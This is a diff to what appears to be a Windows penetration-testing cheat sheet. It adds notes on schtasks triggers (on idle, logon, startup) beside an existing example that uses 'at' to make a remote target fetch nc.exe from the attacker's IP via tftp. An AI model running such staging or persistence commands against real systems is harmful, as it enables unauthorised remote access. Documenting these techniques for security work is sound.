@@ -130,6 +130,17 @@ c:\> at \\[TargetIP] 12:00 pm command
 An example you might run on the remote system might be: `at \\192.168.1.1 12:00pm tftp -I [MyIP] GET nc.exe`
 
 
+### Scheduling tasks to run under special conditions
+
+One can schedule tasks to run under certain conditions such as when a user logs into the computer or when the computer is idle
+with the schtasks command. This can be done by any user and includes the following additional conditions which can come in handy:
+
+* ONIDLE -> Run a command once the system enters an idle state
+* ONLOGON -> Run a command when a user logs into the system
+* ONSTART -> Run a command when the system starts up
+ 
+ If you would like more information on the various command line options for this tool, Microsoft describes them in great
+ detail at: [https://technet.microsoft.com/en-us/library/cc725744.aspx#BKMK_create](https://technet.microsoft.com/en-us/library/cc725744.aspx#BKMK_create)
 
 
 
